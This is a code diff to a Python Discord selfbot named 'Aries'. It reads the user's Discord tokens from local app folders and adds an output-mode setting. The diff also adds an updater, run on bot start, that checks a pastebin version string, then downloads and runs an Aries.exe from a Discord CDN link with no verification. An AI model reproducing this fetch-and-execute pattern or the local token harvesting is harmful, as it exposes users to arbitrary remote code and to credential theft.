@@ -1,6 +1,7 @@
 # ///////////////////////////////////////////////////////////////
 # All Imports
 
+from email.policy import default
 import os
 import re
 import bs4
@@ -35,6 +36,7 @@ import pypresence
 import webbrowser
 import platform
 import ipapi
+import colour
 from art import *
 from gtts import gTTS
 from discord import *
@@ -104,22 +106,21 @@ class misc():
                         tokens.append(token)
         return tokens
     def returnAutoToken():
-        LOCAL = os.getenv("LOCALAPPDATA")
         ROAMING = os.getenv("APPDATA")
-        PATHS = {
-            "Discord"           : ROAMING + "\\Discord",
-            "Discord Canary"    : ROAMING + "\\discordcanary",
+        paths = {
+            f"Discord"           : ROAMING + "\\Discord",
+            f"Discord Canary"    : ROAMING + "\\discordcanary",
         }
-        checked = ""
+        tkns = []
 
-        for platform, path in PATHS.items():
+        for platform, path in paths.items():
             if not os.path.exists(path):
                 continue
             for token in misc.getUserToken(path):
-                if token in checked:
+                if token in tkns:
                     continue
-                checked += token
-        return checked
+                tkns.append(token)
+        return tkns[0]
 #print(autoToken.returnAutoToken())
 init() # Initialize colorama
 #Startup
@@ -131,6 +132,7 @@ else:
     fake_nitro_config = input("                                                  Fake Nitro? (y/n): ")
     selfbot_detection = input("                                                Selfbot Detector? (y/n): ")
     delete_timer = input("                                                     Delete Timer: ")
+    mode = input("Mode? Embed/Normal")
     pingWebhook = input("                                         Ping webhook? (leave blank for none) ")
     configToken = ""
     ISDIR = os.path.isdir("./data")
@@ -151,6 +153,7 @@ else:
     content = r.json()
     username = content.get('username')
     discriminator = content.get('discriminator')
+ #   print(misc.returnAutoToken())
     useFoundTokens = input(f"                             User Account Found: {username}#{discriminator} Would you like to use it? (y/n): ")
     if not useFoundTokens == "y":
         configToken = input("Token: ")
@@ -167,7 +170,8 @@ else:
             "AFK-Message": f"I'm Currently Away!",
             "Fake-Nitro": f"{fake_nitro_config}",
             "Delete_Timer": f"{delete_timer}",
-            "Ping Webhook": f"{pingWebhook}"
+            "Ping Webhook": f"{pingWebhook}",
+            "Mode": f"{mode}"
         }
     if beta:
         misc.authenticate()
@@ -230,18 +234,20 @@ afkmode_config = config.get('AFK')
 afkmsg_config = config.get("AFK-Message")
 deltimer_config = config.get("Delete_Timer")
 pingWebhook_config = config.get("Ping Webhook")
+mode_config = config.get("Mode")
+latestVers = "1.0.6"
 afklogging = False
 copier = False
 person = ""
 NitroSound = False
 fake_nitro = config.get("Fake-Nitro")
 logo = f"""
-                                                   █████╗ ██████╗ ██╗███████╗███████╗
-                                                   ██╔══██╗██╔══██╗██║██╔════╝██╔════╝
-                                                   ███████║██████╔╝██║█████╗  ███████╗
-                                                   ██╔══██║██╔══██╗██║██╔══╝  ╚════██║
-                                                   ██║  ██║██║  ██║██║███████╗███████║
-                                                   ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚══════╝╚══════╝
+                                                  █████╗ ██████╗ ██╗███████╗███████╗
+                                                  ██╔══██╗██╔══██╗██║██╔════╝██╔════╝
+                                                  ███████║██████╔╝██║█████╗  ███████╗
+                                                  ██╔══██║██╔══██╗██║██╔══╝  ╚════██║
+                                                  ██║  ██║██║  ██║██║███████╗███████║
+                                                  ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚══════╝╚══════╝
 
 
 """
@@ -250,6 +256,19 @@ logo = f"""
 # Aries Class & Functions
 
 class aries:
+    def downloadNewVersion():
+        request = requests.get("https://pastebin.com/raw/5f7EKmcE")
+        requestData = request.content.decode()
+        defaultPath = f"{os.getcwd()}"
+        fileName = f"{sys.argv[0]}"
+        if latestVers != requestData:
+            print("Downloading...")
+            url = 'https://cdn.discordapp.com/attachments/775820489758605394/931300544608370738/Aries.exe'
+            r = requests.get(url, allow_redirects=True)
+            open(f'{defaultPath}\Aries.exe', 'wb').write(r.content)
+            print("Outdated!")
+            os.startfile(f"{defaultPath}\Aries.exe")
+            os._exit(1)
     def convertString(s): 
         
         # initialize an empty string
@@ -294,61 +313,77 @@ class aries:
         with open("./data/config.json") as f:
             config = json.load(f)
         theme = config.get('theme')
-        with open(f"./data/themes/{theme_config}.json") as f:
-            #Loads the json to read contents
-            config = json.load(f)
-            color = config.get('color')
-            sixteenIntegerHex = int(color.replace("#", ""), 16)
-            readableHex = int(hex(sixteenIntegerHex), 0)
-            embed = discord.Embed(title=config.get('title'), description = f"{description}", color=readableHex)
-            embed.set_thumbnail(url = config.get('imageurl'))
-            embed.set_footer(text = "made with ♡ by bomt & Nshout")
-            await ctx.send(embed = embed, delete_after=int(deltimer_config))
+        if mode_config == "Embed":
+            with open(f"./data/themes/{theme_config}.json") as f:
+                #Loads the json to read contents
+                config = json.load(f)
+                color = config.get('color')
+                sixteenIntegerHex = int(color.replace("#", ""), 16)
+                readableHex = int(hex(sixteenIntegerHex), 0)
+                embed = discord.Embed(title=config.get('title'), description = f"{description}", color=readableHex)
+                embed.set_thumbnail(url = config.get('imageurl'))
+                embed.set_footer(text = "made with ♡ by bomt & Nshout")
+                await ctx.send(embed = embed, delete_after=int(deltimer_config))
+        elif mode_config == "Normal":
+                await ctx.send(f"{config.get('title')}\n{description}")
     async def sendCustomEmbed(ctx, title:string, description:string):
         await ctx.message.delete()
         with open("./data/config.json") as f:
             config = json.load(f)
         theme = config.get('theme')
-        with open(f"./data/themes/{theme_config}.json") as f:
-            #Loads the json to read contents
-            config = json.load(f)
-            color = config.get('color')
-            sixteenIntegerHex = int(color.replace("#", ""), 16)
-            readableHex = int(hex(sixteenIntegerHex), 0)
-            embed = discord.Embed(title=f"{title}", description = f"{description}", color=readableHex)
-            embed.set_thumbnail(url = config.get('imageurl'))
-            embed.set_footer(text = "made with ♡ by bomt & Nshout")
-            await ctx.send(embed = embed, delete_after=int(deltimer_config))
+        if mode_config == "Embed":
+            with open(f"./data/themes/{theme_config}.json") as f:
+                #Loads the json to read contents
+                config = json.load(f)
+                color = config.get('color')
+                sixteenIntegerHex = int(color.replace("#", ""), 16)
+                readableHex = int(hex(sixteenIntegerHex), 0)
+                embed = discord.Embed(title=f"{title}", description = f"{description}", color=readableHex)
+                embed.set_thumbnail(url = config.get('imageurl'))
+                embed.set_footer(text = "made with ♡ by bomt & Nshout")
+                await ctx.send(embed = embed, delete_after=int(deltimer_config))
+        elif mode_config == "Normal":
+            with open(f"./data/themes/{theme_config}.json") as f:
+                config = json.load(f)
+                await ctx.send(f"{title}\n{description}\n{config.get('imageurl')}", delete_after=int(deltimer_config))
     async def sendEmbedNoDelete(ctx, description:string):
         with open("./data/config.json") as f:
             config = json.load(f)
         theme = config.get('theme')
-        with open(f"./data/themes/{theme_config}.json") as f:
-            #Loads the json to read contents
-            config = json.load(f)
-            color = config.get('color')
-            sixteenIntegerHex = int(color.replace("#", ""), 16)
-            readableHex = int(hex(sixteenIntegerHex), 0)
-            embed = discord.Embed(title=config.get('title'), description = f"{description}", color=readableHex)
-            embed.set_thumbnail(url = config.get('imageurl'))
-            embed.set_footer(text = "made with ♡ by bomt & Nshout")
-            await ctx.send(embed = embed, delete_after=int(deltimer_config))
+        if mode_config == "Embed":
+            with open(f"./data/themes/{theme_config}.json") as f:
+                #Loads the json to read contents
+                config = json.load(f)
+                color = config.get('color')
+                sixteenIntegerHex = int(color.replace("#", ""), 16)
+                readableHex = int(hex(sixteenIntegerHex), 0)
+                embed = discord.Embed(title=config.get('title'), description = f"{description}", color=readableHex)
+                embed.set_thumbnail(url = config.get('imageurl'))
+                embed.set_footer(text = "made with ♡ by bomt & Nshout")
+                await ctx.send(embed = embed, delete_after=int(deltimer_config))
+        elif mode_config == "Normal":
+            with open(f"./data/themes/{theme_config}.json") as f:
+                config = json.load(f)
+                await ctx.send(f"{config.get('title')}\n{description}\n{config.get('imageurl')}", delete_after=int(deltimer_config))
     async def sendFullyCustomEmbed(ctx, title:string, description:string, image:string):
         await ctx.message.delete()
         with open("./data/config.json") as f:
             config = json.load(f)
         theme = config.get('theme')
-        with open(f"./data/themes/{theme_config}.json") as f:
-            #Loads the json to read contents
-            config = json.load(f)
-            color = config.get('color')
-            sixteenIntegerHex = int(color.replace("#", ""), 16)
-            readableHex = int(hex(sixteenIntegerHex), 0)
-            embed = discord.Embed(title=f"{title}", description = f"{description}", color=readableHex)
-            embed.set_thumbnail(url = config.get('imageurl'))
-            embed.set_image(url=image)
-            embed.set_footer(text = "made with ♡ by bomt & Nshout")
-            await ctx.send(embed = embed, delete_after=int(deltimer_config))
+        if mode_config == "Embed":
+            with open(f"./data/themes/{theme_config}.json") as f:
+                #Loads the json to read contents
+                config = json.load(f)
+                color = config.get('color')
+                sixteenIntegerHex = int(color.replace("#", ""), 16)
+                readableHex = int(hex(sixteenIntegerHex), 0)
+                embed = discord.Embed(title=f"{title}", description = f"{description}", color=readableHex)
+                embed.set_thumbnail(url = config.get('imageurl'))
+                embed.set_image(url=image)
+                embed.set_footer(text = "made with ♡ by bomt & Nshout")
+                await ctx.send(embed = embed, delete_after=int(deltimer_config))
+        elif mode_config == "Normal":
+                await ctx.send(f"{title}\n{description}\n{image}", delete_after=int(deltimer_config))
 # ///////////////////////////////////////////////////////////////
 # Security Class & Functions
 
@@ -583,7 +618,7 @@ bot = commands.Bot(bot_prefix, self_bot=True, case_insensitive=True, guild_subsc
 bot.remove_command("help")
 @bot.event
 async def on_command_error(ctx, error):
-    await ctx.message.delete()
+  #  await ctx.message.delete()
     print(f"\n{Fore.LIGHTRED_EX}[Error] {Fore.RESET} - Command Error {Fore.LIGHTRED_EX} {error}")
 
 @bot.event
@@ -595,6 +630,7 @@ async def on_ready():
     print("  " + Fore.LIGHTRED_EX + f"{bot.user}".center(os.get_terminal_size().columns) + Fore.RESET + f"{motd}".center(os.get_terminal_size().columns))
     print("    " + Fore.RED + f"{str(len(bot.guilds))}{Fore.RESET} Servers".center(os.get_terminal_size().columns))
     print("    " + Fore.RED + f"{str(len(bot.user.friends))} {Fore.RESET}Friends".center(os.get_terminal_size().columns))
+    aries.downloadNewVersion()
 @bot.event
 async def on_message(message):
     if (pingWebhook_config != ""):
